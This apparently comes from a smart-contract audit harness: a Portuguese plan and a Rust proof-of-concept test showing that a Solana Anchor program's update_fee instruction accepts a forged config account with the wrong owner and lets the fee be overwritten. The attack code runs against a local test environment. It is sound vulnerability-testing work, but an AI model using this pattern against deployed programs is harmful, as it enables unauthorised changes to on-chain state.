{
  "plan": "Preparo uma conta forjada cujo owner NAO e o programa-alvo (owner = System Program), com bytes 8..40 contendo a pubkey do atacante (authority) e bytes 40..48 com um fee inicial. O baseline usa a instrucao update_fee com uma conta config legitima (owner = program_id, admin = authority) para provar que o cenario esta montado corretamente. O ataque repete a mesma chamada, mas passando a conta forjada como config; como o handler nao verifica o owner, a comparacao admin==authority passa e o fee e sobrescrito. O efeito mede que os bytes 40..48 da conta forjada foram alterados para o novo valor, demonstrando que uma conta de dono estranho foi aceita e escrita.",
  "scenario": "let authority = Pubkey::new_unique();

// Conta forjada: owner = System Program (nao o programa-alvo), mas com layout AdminConfig
let forged_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let forged = account(&solana_sdk::system_program::ID, &forged_data, None);

// Conta legitima: owner = program_id, admin = authority
let legit_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let legit = account(&env.program_id, &legit_data, None);

let metas = vec![
    AccountMeta::new(forged_key, false),
    AccountMeta::new_readonly(authority, true),
];

// Baseline: uso legitimo com a conta correta
let legit_metas = vec![
    AccountMeta::new(legit_key, false),
    AccountMeta::new_readonly(authority, true),
];
let baseline_ix = env.anchor_ix("update_fee", &(200u64,), legit_metas);
let baseline_accounts = vec![
    (legit_key, legit.clone()),
    (authority, wallet(1_000_000_000)),
];
let _ = env.baseline("update_fee legitimo", &baseline_ix, &baseline_accounts);

// Ataque: mesma chamada, mas com a conta forjada (owner diferente)
let attack_ix = env.anchor_ix("update_fee", &(999u64,), metas);
let attack_accounts = vec![
    (forged_key, forged),
    (authority, wallet(1_000_000_000)),
];
let r = env.attack("update_fee com conta forjada", &attack_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let after_forged = after(&r, &forged_key);
    env.effect(
        "fee da conta forjada foi sobrescrito para 999",
        read_u64(after_forged.data(), 40) == 999u64,
    );
    env.effect(
        "conta forjada tem owner diferente do programa",
        after_forged.owner() != &env.program_id,
    );
}"
}

